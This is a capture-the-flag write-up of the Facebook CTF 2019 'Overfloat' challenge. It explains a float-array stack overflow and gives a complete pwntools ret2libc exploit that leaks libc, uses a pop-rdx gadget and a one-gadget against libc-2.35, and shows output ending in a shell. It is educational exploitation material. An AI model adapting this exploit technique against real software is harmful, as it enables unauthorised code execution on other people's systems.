# Facebook CTF 2019 - Overfloat

## Overview

- Tested on Ubuntu 18.04 with libc-2.27.so
- Tested on Ubuntu 22.04 with libc-2.35.so

For 2.35 one shot gadget requires:
- `r10`=0x0 - already the case for us
- `rdx`=0x0
- `rbp`-0x78 to be writable

## Aim

The main aim of this write-up is to help the user exploit ret2libc with a more up to date version of libc (as of 2024). Due to this, I chose a CTF that would have fewer security features so we could focus on the ret2lib attack.

This CTF has many solutions. However, all are for libc-2.27, the version that this CTF initially shipped with. I wanted to exploit this issue while linking against libc-2.35. This version has been more security hardened and the usual one shot gadget cannot be as easily exploited.

## Gathering Info

```
# pwn checksec overfloat
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

# file overfloat
overfloat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8ae8ef04d2948115c648531ee0c12ba292b92ae4, not stripped
```
A quick look at the executable shows that this is a 64-bit ELF, and it looks like we only have to defeat NX. When NX is enabled, the stack is not executable. How does one overcome this security feature? Simple, just don't execute the stack.

## Let's run it

```
$ ./overfloat
                                 _ .--.
                                ( `    )
                             .-'      `--,
                  _..----.. (             )`-.
                .'_|` _|` _|(  .__,           )
               /_|  _|  _|  _(        (_,  .-'
              ;|  _|  _|  _|  '-'__,--'`--'
              | _|  _|  _|  _| |
          _   ||  _|  _|  _|  _|
        _( `--.\_|  _|  _|  _|/
     .-'       )--,|  _|  _|.`
    (__, (_      ) )_|  _| /
      `-.__.\ _,--'\|__|__/
                    ;____;
                     \YT/
                      ||
                     |""|
                     '=='

WHERE WOULD YOU LIKE TO GO?
LAT[0]: 1
LON[0]: 2
LAT[1]: 3
LON[1]: 4
LAT[2]: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
LON[2]: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

We're asked for a latitude and longitude pairs, endlessly. Let's have a look at the code (disassemble with Ghidra, IDA Pro, Binary Ninja...):

```c=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE charBuf[48]; // [rsp+10h] [rbp-30h] BYREF

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  alarm(0x1Eu);
  __sysv_signal(14, timeout);
  puts(
    "                                 _ .--.        \n"
    "                                ( `    )       \n"
    "                             .-'      `--,     \n"
    "                  _..----.. (             )`-. \n"
    "                .'_|` _|` _|(  .__,           )\n"
    "               /_|  _|  _|  _(        (_,  .-' \n"
    "              ;|  _|  _|  _|  '-'__,--'`--'    \n"
    "              | _|  _|  _|  _| |               \n"
    "          _   ||  _|  _|  _|  _|               \n"
    "        _( `--.\\_|  _|  _|  _|/               \n"
    "     .-'       )--,|  _|  _|.`                 \n"
    "    (__, (_      ) )_|  _| /                   \n"
    "      `-.__.\\ _,--'\\|__|__/                  \n"
    "                    ;____;                     \n"
    "                     \\YT/                     \n"
    "                      ||                       \n"
    "                     |\"\"|                    \n"
    "                     '=='                      \n"
    "\n"
    "WHERE WOULD YOU LIKE TO GO?");
  memset(charBuf, 0, 0x28uLL);
  chart_course(charBuf);
  puts("BON VOYAGE!");
  return 0;
}
```

What we can note is that `charBuf`is 48 bytes long array and we pass it to `chart_course`. Let's have a look at that `chart_course`:

```
__int64 __fastcall chart_course(__int64 charBuf)
{
  __int64 result; // rax
  float floatInput; // xmm1_4
  char input[104]; // [rsp+10h] [rbp-70h] BYREF
  float floatIn2; // [rsp+78h] [rbp-8h]
  int lat_or_lon; // [rsp+7Ch] [rbp-4h] number of lat/lons input
                  //

  for ( lat_or_lon = 0; ; ++lat_or_lon )
  {
    if ( (lat_or_lon & 1) != 0 )
      printf("LON[%d]: ", lat_or_lon / 2 % 10);
    else
      printf("LAT[%d]: ", lat_or_lon / 2 % 10);
    fgets(input, 100, stdin);
    if ( !strncmp(input, "done", 4uLL) )
      break;
    floatInput = atof(input);
    floatIn2 = floatInput;
    memset(input, 0, 0x64uLL);
    *(float *)(4LL * lat_or_lon + charBuf) = floatIn2;
LABEL_9:
    ;
  }
  result = lat_or_lon & 1;
  if ( (lat_or_lon & 1) != 0 )
  {
    puts("WHERES THE LONGITUDE?");
    --lat_or_lon;
    goto LABEL_9;
  }
  return result;
}
```

This function is scanning in four byte floats into the the pointer passed as an argument, which was `charBuf`. What is interesting is that we are reading in 100 bytes into input (which is 104 bytes), converting it to float and storing it in (`x`* 4) * `charBuf`. `x` is equal to the number of floats already scanned in. Here we have our buffer overflow since there are no checks performed.

This is an endless loop of input unless the first 4 bytes of the input are `done`.


## ret2libc

Why ret2libc attack? Well the binary isn't large and so creating an ROP chain may not be possible. Instead what we can do is use a onegadget (with a tool like [one_gadget](https://github.com/david942j/one_gadget)).

### libc leak

First we need to leak an address from libc so we can find the base. Once we've established the base, we can successfully call other instructions using an offset.

One method to leak libc with ROP is the usual: GOT > rdi > plt:

#### GOT entry address - `puts`
```
$ objdump -R overfloat | grep puts
0000000000602020 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
```

#### PLT address - `puts`
```
$ objdump -D overfloat | grep puts
0000000000400690 <puts@plt>:
  400690:       ff 25 8a 19 20 00       jmp    *0x20198a(%rip)        # 602020 <puts@GLIBC_2.2.5>
  400846:       e8 45 fe ff ff          call   400690 <puts@plt>
  400933:       e8 58 fd ff ff          call   400690 <puts@plt>
  4009e8:       e8 a3 fc ff ff          call   400690 <puts@plt>
  400a14:       e8 77 fc ff ff          call   400690 <puts@plt>
```

#### Gadget -  `pop rdi`
```
ROPgadget
 --binary overfloat | grep "pop rdi"
0x0000000000400a83 : pop rdi ; ret
```

With this we can now leak the address of puts, with puts. From that, we can calculate the base address of libc. With this info leak, we can now loop back to main and jump to the gadgets required.

So we have all that we need to leak libc:
```
# libc leak
putsPlt = 0x400690
putsGot = 0x602020
popRdi = 0x400a83
```

### One Gadget
```
$ one_gadget libc-2.35.so
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebc85 execve("/bin/sh", r10, rdx)
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebc88 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebce2 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebd38 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd3f execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

What is interesting here is the contraints to successfully pop a shell for each of the gadgets. We will be focusing on the second gadget - `0xebc85`. This requires both `r10` and `rdx` to be `0`/null. After our libc leak, we can confirm with gdb that `r10` is already equal to 0, however `rdx` is equal to 0x1. So we need a way to set the value of it.

#### rdx=0x0
Since we have a libc leak, we can find many gadgets in libc that will set rdx to 0. The first one that stood out was:

```
$ ROPgadget --binary libc-2.35.so | grep "pop rdx"
...
0x000000000011f2e7 : pop rdx ; pop r12 ; ret
...
```

We don't care what the value of r12 is set to in this case (so also just set that to 0).

#### `rbp`-0x78 must be writable

The last step is to have the address at `rbp`-0x78 be writable. Since the `.bss` section is generally always writable, we will just set rbp to point there. As you may have guessed, if we input 6 bytes to fill up `charBuf`, then the next byte will set `rbp`.


# Complete Exploit

Putting it all together now:

```python=
from pwn import *
import struct

mainFunc = 0x400993

# libc leak
putsPlt = 0x400690
putsGot = 0x602020
popRdi = 0x400a83

# one gadget
# requirements:
#   rbp-0x78 is writable
#   [r10] == NULL
#   [rdx] == NULL
popRdxR12Offset = 0x11f2e7
oneShotOffset = 0xebc85


# Some helper functions to help with the float input
# These were made by qw3rty01
pf = lambda x: struct.pack('f', x)
uf = lambda x: struct.unpack('f', x)[0]



# Establish the target, and the libc file
target = process('./overfloat', env={"LD_PRELOAD":"./libc-2.35.so"})
# gdb.attach(target, '''
#     b *0x400A19
#     c
# ''')

libc = ELF('libc-2.35.so')

# Get a writable address to set rbp for one shot gadget
elf = ELF('./overfloat')
bss_section = elf.bss()


# A helper function to send input as float
def sendVal(x):
    v1 = x & ((2**32) - 1)
    v2 = x >> 32
    target.sendline(str(uf(p32(v1))))
    target.sendline(str(uf(p32(v2))))

# Fill up the space to return
# 48 + 8 bytes
for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

# Send the rop chain to print libc address of puts
# then loop around to the start of main
sendVal(popRdi)
sendVal(putsGot)
sendVal(putsPlt)
sendVal(mainFunc)

# Send done so our code executes
target.sendline('done')

# Print out the target output
print(target.recvuntil('BON VOYAGE!\n'))

# Scan in, filter out the libc infoleak, calculate the base
leak = target.recv(6)
leak = u64(leak + b"\x00"*(8-len(leak)))
base = leak - libc.symbols['puts']

# libc base
print("libc base: " + hex(base))


# Fill up charBuf
for i in range(6):
    sendVal(0xdeadbeefdeadbeef)
# Overwrite rbp register with writable memory - bss section is always writable
sendVal(bss_section)

# Overwrite rdx 0x0, also r12
print(f'Jumpiong to {hex(base + popRdxR12Offset)}')
sendVal(base + popRdxR12Offset)
sendVal(0x0)
sendVal(0x0)

# Overwrite the return address with a one gadget
print(f'Jumping to {hex(base + oneShotOffset)}')
sendVal(base + oneShotOffset)

# Send done so our rop chain executes
target.sendline('done')

target.interactive()
```


Running
```
$ python3 myExploit.py
[+] Starting local process './overfloat': pid 3764
  print(target.recvuntil('BON VOYAGE!\n'))
b'                                 _ .--.        \n                                ( `    )       \n                             .-\'      `--,     \n                  _..----.. (             )`-. \n                .\'_|` _|` _|(  .__,           )\n               /_|  _|  _|  _(        (_,  .-\' \n              ;|  _|  _|  _|  \'-\'__,--\'`--\'    \n              | _|  _|  _|  _| |               \n          _   ||  _|  _|  _|  _|               \n        _( `--.\\_|  _|  _|  _|/               \n     .-\'       )--,|  _|  _|.`                 \n    (__, (_      ) )_|  _| /                   \n      `-.__.\\ _,--\'\\|__|__/                  \n                    ;____;                     \n                     \\YT/                     \n                      ||                       \n                     |""|                    \n                     \'==\'                      \n\nWHERE WOULD YOU LIKE TO GO?\nLAT[0]: LON[0]: LAT[1]: LON[1]: LAT[2]: LON[2]: LAT[3]: LON[3]: LAT[4]: LON[4]: LAT[5]: LON[5]: LAT[6]: LON[6]: LAT[7]: LON[7]: LAT[8]: LON[8]: LAT[9]: LON[9]: LAT[0]: LON[0]: LAT[1]: BON VOYAGE!\n'
libc base: 0x722e54400000
Jumpiong to 0x722e5451f2e7
Jumping to 0x722e544ebc85
  target.sendline('done')
[*] Switching to interactive mode

                                 _ .--.
                                ( `    )
                             .-'      `--,
                  _..----.. (             )`-.
                .'_|` _|` _|(  .__,           )
               /_|  _|  _|  _(        (_,  .-'
              ;|  _|  _|  _|  '-'__,--'`--'
              | _|  _|  _|  _| |
          _   ||  _|  _|  _|  _|
        _( `--.\_|  _|  _|  _|/
     .-'       )--,|  _|  _|.`
    (__, (_      ) )_|  _| /
      `-.__.\ _,--'\|__|__/
                    ;____;
                     \YT/
                      ||
                     |""|
                     '=='

WHERE WOULD YOU LIKE TO GO?
LAT[0]: LON[0]: LAT[1]: LON[1]: LAT[2]: LON[2]: LAT[3]: LON[3]: LAT[4]: LON[4]: LAT[5]: LON[5]: LAT[6]: LON[6]: LAT[7]: LON[7]: LAT[8]: LON[8]: LAT[9]: LON[9]: LAT[0]: LON[0]: LAT[1]: BON VOYAGE!
$ cat flag
Fr0zen1
```
